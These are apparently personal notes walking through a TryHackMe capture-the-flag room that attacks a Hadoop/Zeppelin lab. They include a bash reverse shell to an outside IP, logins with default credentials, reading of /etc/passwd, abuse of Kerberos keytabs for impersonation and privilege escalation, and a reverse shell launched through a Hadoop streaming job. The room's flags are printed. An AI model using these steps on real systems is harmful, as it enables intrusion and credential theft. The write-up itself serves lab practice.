# initial access
### Foothold
---
## login to Zepplin edge node
- In web Browser navigate to thm_hapoop_network.net:8080
- From Notebook select TestNode note
- this shows the contents of "shiro.ini" and FLAG1
	- %python
	import os
	os.system('cat conf/shiro.ini')
	%FLAG1- THM{Whats.That.Smell.On.The.Hindenburg?}
- Also find default creds
	- !#admin = password1, admin
	user1 = password2, role1, role2
	user2 = p@ssw0rd12345, role3
	user3 = password4, role2
- At the bottom of the page you will find a python interpreter that allows you to run python code
	- pop in a  bash one liner 
		- python
			import os
			os.system('bash -i >& /dev/tcp/10.8.0.2/1234 0>&1')
- you will get a pop up telling you that you don't have permissions to execute code
- 
 ![[Pasted image 20220304100057.png]]


	- so going back to the default users 
	- login as user2
- rerun the python interpreter 
	- get revshell on box and stablize she with the python one liner

# On the Box as user zp
## Enumerate User
- cat flag2.txt
- upload and run linpeas.sh
## Kerberos authentication

- Kerberos keytabs
	- Locate KeyTabs
		- /etc/security/keytabs/
	
 - [zp@hadoop zeppelin]$ ls -l /etc/security/keytabs/
			total 36
		-r--r----- 1 root hadoop_services 436 Mar  4 15:37 dn.service.keytab
		-r--r----- 1 root hadoop_services 442 Mar  4 15:37 jhs.service.keytab
		-r--r----- 1 root hadoop_super    436 Mar  4 15:37 nm.service.keytab
		-r--r----- 1 root hadoop_services 436 Mar  4 15:37 nn.service.keytab
		-r--r----- 1 root hadoop_services 436 Mar  4 15:37 rm.service.keytab
		-r-------- 1 root hadoop_super    334 Mar  4 15:37 root.service.keytab
		-r--r----- 1 root hadoop_services 448 Mar  4 15:37 spnego.service.keytab
		-r--r----- 1 root hadoop_services 448 Mar  4 15:37 yarn.service.keytab
		-r--r----- 1 root hadoop_services 436 Mar  4 15:37 zp.service.keytab
-  The klist command can be used to gather information from a keytab
	-  `klist -k <keytabfile>`
		[zp@hadoop zeppelin]$ klist -k /etc/security/keytabs/zp.service.keytab
		Keytab name: FILE:/etc/security/keytabs/zp.service.keytab
		KVNO Principal:
		   2 zp/hadoop.docker.com@EXAMPLE.COM
		   2 zp/hadoop.docker.com@EXAMPLE.COM
		   2 zp/hadoop.docker.com@EXAMPLE.COM
		   2 zp/hadoop.docker.com@EXAMPLE.COM
		   2 zp/hadoop.docker.com@EXAMPLE.COM
		   2 zp/hadoop.docker.com@EXAMPLE.COM
-  The kinit command can be used with information from  a keytab, for authenticating to a Kerberos server, and request a ticket
	- `kinit <principal name> -k -V -t <keytabfile>`
	- Authenticate as the zp user 
		- 
- locate the hadoop/bin directory and add it to $PATH to be able to run hdfs commands
	- export PATH=/usr/local/hadoop/bin:$PATH
	- using HDFS commands cat flag3.txt in the zp user's HDFS home directory

# Privilege Escalation

- Using the above proccess escalate privileges to the Yarn service
- verify escalation by using the HDFS interface to touch a file to the `/tmp`
	- grab the flag in the impersonated user's HDFS home directory (flag4.txt)
- create remote code execution job that will drop you into a os shell as the Yarn user
	- ## read file
		- hadoop jar share/hadoop/tools/lib/hadoop-streaming-2.7.7.jar -input /tmp/shell.sh -output test/ -mapper "/bin/cat /etc/passwd" -reducer NONE
	- ## reverse shell [[revshell]]
		- hadoop jar /usr/local/hadoop-2.7.7/share/hadoop/tools/lib/hadoop-streaming-2.7.7.jar -input /tmp/shell.sh -output masdf -mapper ./shell.sh -reducer NONE -file "shell.sh" -background

Privilege Escalation Notes
---
* [[#Enumeration]] 
* [[#Initial Foothold]] 
* [[#Privilege Escalation]]